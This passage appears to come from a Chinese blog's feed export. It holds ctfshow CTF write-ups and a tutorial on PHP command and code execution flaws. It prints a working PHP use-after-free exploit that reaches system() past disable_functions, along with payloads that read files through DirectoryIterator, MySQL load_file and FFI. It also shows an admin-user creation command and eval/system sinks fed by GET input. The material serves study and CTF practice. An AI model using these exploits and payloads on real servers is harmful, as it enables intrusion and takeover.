<span class="token variable">$deref</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$leak</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$deref</span> <span class="token operator">!=</span> <span class="token number">0x786568326e6962</span><span class="token punctuation">)</span>                    <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token variable">$data_addr</span> <span class="token operator">+</span> <span class="token variable">$i</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$base</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$start</span> <span class="token operator">=</span> <span class="token variable">$binary_leak</span> <span class="token operator">&amp;</span> <span class="token number">0xfffffffffffff000</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x1000</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$start</span> <span class="token operator">-</span> <span class="token number">0x1000</span> <span class="token operator">*</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$leak</span> <span class="token operator">==</span> <span class="token number">0x10102464c457f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token variable">$addr</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$addr</span> <span class="token operator">=</span> <span class="token variable">$basic_funcs</span><span class="token punctuation">;</span>        <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$f_entry</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$f_name</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$f_name</span> <span class="token operator">==</span> <span class="token number">0x6d6574737973</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$addr</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$addr</span> <span class="token operator">+=</span> <span class="token number">0x20</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token variable">$f_entry</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">trigger_uaf</span><span class="token punctuation">(</span><span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token variable">$arg</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$vuln</span><span class="token operator">-></span><span class="token property">a</span> <span class="token operator">=</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">stristr</span><span class="token punctuation">(</span><span class="token constant">PHP_OS</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'WIN'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'This PoC is for *nix systems only.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$n_alloc</span> <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token variable">$contiguous</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$n_alloc</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token variable">$contiguous</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_shuffle</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">trigger_uaf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc</span> <span class="token operator">=</span> <span class="token variable">$backtrace</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'args'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Helper</span><span class="token punctuation">;</span>    <span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span> <span class="token operator">=</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">79</span> <span class="token operator">||</span> <span class="token class-name">strlen</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"UAF failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$closure_handlers</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$php_heap</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$abc_addr</span> <span class="token operator">=</span> <span class="token variable">$php_heap</span> <span class="token operator">-</span> <span class="token number">0xc8</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x60</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x70</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token number">0x60</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x18</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$closure_obj</span> <span class="token operator">=</span> <span class="token function">str2ptr</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$binary_leak</span> <span class="token operator">=</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_handlers</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$base</span> <span class="token operator">=</span> <span class="token function">get_binary_base</span><span class="token punctuation">(</span><span class="token variable">$binary_leak</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't determine binary base address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$elf</span> <span class="token operator">=</span> <span class="token function">parse_elf</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't parse ELF header"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span> <span class="token operator">=</span> <span class="token function">get_basic_funcs</span><span class="token punctuation">(</span><span class="token variable">$base</span><span class="token punctuation">,</span> <span class="token variable">$elf</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get basic_functions address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$zif_system</span> <span class="token operator">=</span> <span class="token function">get_system</span><span class="token punctuation">(</span><span class="token variable">$basic_funcs</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't get zif_system address"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$fake_obj_offset</span> <span class="token operator">=</span> <span class="token number">0xd0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">0x110</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">+=</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token variable">$fake_obj_offset</span> <span class="token operator">+</span> <span class="token variable">$i</span><span class="token punctuation">,</span> <span class="token function">leak</span><span class="token punctuation">(</span><span class="token variable">$closure_obj</span><span class="token punctuation">,</span> <span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0x20</span><span class="token punctuation">,</span> <span class="token variable">$abc_addr</span> <span class="token operator">+</span> <span class="token variable">$fake_obj_offset</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token function">write</span><span class="token punctuation">(</span><span class="token variable">$abc</span><span class="token punctuation">,</span> <span class="token number">0xd0</span> <span class="token operator">+</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token variable">$zif_system</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">(</span><span class="token variable">$helper</span><span class="token operator">-></span><span class="token property">b</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"cat /flag0.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ob_end_flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web73-74"><a href="#web73-74" class="headerlink" title="web73-74"></a>web73-74</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php">c=?><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DirectoryIterator</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"glob:///*"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token operator">-></span><span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string single-quoted-string">' '</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/flag.txt'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web75-76"><a href="#web75-76" class="headerlink" title="web75-76"></a>web75-76</h2><p>读文件，使用mysql load_file</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">c<span class="token operator">=</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PDO</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'mysql:host=localhost;dbname=ctftraining'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dbh</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'select load_file("/flag36.txt")'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">.</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token variable">$dbh</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">PDOException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token variable">$e</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getMessage</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="web77"><a href="#web77" class="headerlink" title="web77"></a>web77</h2><p>貌似用到了php7.4的新特性，再说吧，有空再研究研究。</p><pre class="line-numbers language-none"><code class="language-none">c&#x3D;$ffi&#x3D;FFI::cdef(&quot;int system(char *command);&quot;, &quot;libc.so.6&quot;);$a&#x3D;&#39;&#x2F;readflag &gt; 1.txt&#39;;$ffi-&gt;system($a);exit();  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://blog.csdn.net/solitudi/article/details/109837640?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522163342323316780265481117%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=163342323316780265481117&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-109837640.pc_v2_rank_blog_default&utm_term=ctfshow+web%E5%85%A5%E9%97%A8%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C&spm=1018.2226.3001.4450">[CTFSHOW]命令执行</a></p><p><a href="https://www.cxyzjd.com/article/qq_38154820/107171940">无参数读文件和RCE总结_合天网安学院-程序员宅基地</a></p><p><a href="https://www.cnblogs.com/aninock/p/15125215.html">ctfshow-web入门命令执行-web40/web41(附python脚本)</a></p><p><a href="https://blog.csdn.net/miuzzx/article/details/108619930">ctfshow web入门58-77绕过disable function</a></p>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 命令执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2021/10/04/ming-ling-zhi-xing/"/>
      <url>/2021/10/04/ming-ling-zhi-xing/</url>
      
        <content type="html"><![CDATA[<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>在Web应用中有时候程序员为了考虑灵活性、简洁性，会在代码调用代码或命令执行函数去处理。比如，当应用在调用一些能将字符串转化成代码的函数时，没有考虑用户是否能控制这个字符串，将造成代码执行漏洞。同样调用系统命令处理，将造成命令执行漏洞。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p><img src="1.png"></p><h2 id="代码执行与命令执行的区别"><a href="#代码执行与命令执行的区别" class="headerlink" title="代码执行与命令执行的区别"></a>代码执行与命令执行的区别</h2><h3 id="命令执行漏洞："><a href="#命令执行漏洞：" class="headerlink" title="命令执行漏洞："></a>命令执行漏洞：</h3><p>直接调用操作系统命令(相当于在cmd下敲命令)</p><p>命令执行漏洞的原理：在操作系统中，“&amp;、|、||”都可以作为命令连接符使用，用户通过浏览器提交执行命令，由于服务器端没有针对执行函数做过滤，导致在没有指定绝对路径的情况下就执行命令(如添加一个名为admin 密码为admin的用户 net user admin admin/add net localgroup administrators admin /add 加入管理员组（赋予管理员权限）)</p><p>常见的组合：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">command1<span class="token operator">&amp;</span>command2 两个命令同时执行command1<span class="token operator">&amp;&amp;</span>command2 只有前面命令执行成功，后面命令才继续执行command1<span class="token punctuation">;</span>command2 不管前面命令执行成功没有，后面的命令继续执行<span class="token class-name">command1</span><span class="token operator">||</span><span class="token class-name">command2</span> 顺序执行多条命令，当碰到执行正确的命令后将不执行后面的命令<span class="token class-name">command1</span><span class="token operator">|</span><span class="token class-name">command2</span>  将第一个的输出结果，作为后一个的命令输入。前后都执行，但是只现实后面结果。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="常用的函数"><a href="#常用的函数" class="headerlink" title="常用的函数"></a>常用的函数</h4><ol><li>System：system函数可以用来执行一个外部的应用程序并将相应的执行结果输出，函数原型如下：</li></ol><p>string system(string command, int&amp;return_var)<br>其中，command是要执行的命令，return_var存放执行命令的执行后的状态值。一般来说，如果正确linux会返回0。</p><ol start="2"><li>Exec：exec函数可以用来执行一个外部的应用程序</li></ol><p>string exec (string command, array&amp;output, int &amp;return_var)<br>其中，command是要执行的命令，output是获得执行命令输出的每一行字符串，return_var存放执行命令后的状态值。</p><ol start="3"><li>Passthru：passthru函数可以用来执行一个UNIX系统命令并显示原始的输出，当UNIX系统命令的输出是二进制的数据，并且需要直接返回值给浏览器时，需要使用passthru函数来替代system与exec函数。Passthru函数原型如下：</li></ol><p>void passthru (string command, int&amp;return_var)<br>其中，command是要执行的命令，return_var存放执行命令后的状态值。</p><ol start="4"><li>Shell_exec：执行shell命令并返回输出的字符串，函数原型如下：</li></ol><p>string shell_exec (string command)<br>其中，command是要执行的命令。</p><h3 id="代码执行漏洞："><a href="#代码执行漏洞：" class="headerlink" title="代码执行漏洞："></a>代码执行漏洞：</h3><p>应用程序在调用一些能够将字符串转换为代码的函数（如PHP中的eval）时，没有考虑用户是否控制这个字符串，将造成代码执行漏洞。</p><h4 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h4><p>PHP: eval、assert、preg_replace()、+/e模式（PHP版本&lt;5.5.0）</p><h2 id="eval-与-system"><a href="#eval-与-system" class="headerlink" title="eval 与 system"></a>eval 与 system</h2><h3 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>把字符串 code 作为PHP代码执行。<br>  警告<br>  函数eval()语言结构是 非常危险的， 因为它允许执行任意 PHP 代码。 它这样用是很危险的。 如果您仔细的确认过，除了使用此结构以外 别无方法, 请多加注意，不要允许传入任何由用户 提供的、未经完整验证过的数据 。</p></blockquote><p>如果，在上述代码中，传入参数x=phpinfo();则显示php具体信息。</p><h3 id="system"><a href="#system" class="headerlink" title="system"></a>system</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'x'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">// eval($code);</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>system(string $command, int &amp;$return_var = ?): string<br>  同 C 版本的 system() 函数一样， 本函数执行 command 参数所指定的命令， 并且输出执行结果。<br><br>  如果 PHP 运行在服务器模块中， system() 函数还会尝试在每行输出完毕之后， 自动刷新 web 服务器的输出缓存。<br><br>  command<br>  要执行的命令。<br><br>  return_var<br>  如果提供 return_var 参数， 则外部命令执行后的返回状态将会被设置到此变量中。</p></blockquote><h2 id="常见的绕过方式"><a href="#常见的绕过方式" class="headerlink" title="常见的绕过方式"></a>常见的绕过方式</h2><h3 id="特定字符绕过"><a href="#特定字符绕过" class="headerlink" title="特定字符绕过"></a>特定字符绕过</h3><h4 id="文件名绕过"><a href="#文件名绕过" class="headerlink" title="文件名绕过"></a>文件名绕过</h4><p>比如</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token comment">/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-09-04 00:12:34# @Last Modified by:   h1xa# @Last Modified time: 2020-09-04 00:26:48# @email: h1xa@ctfer.com# @link: https://ctfer.com*/</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" 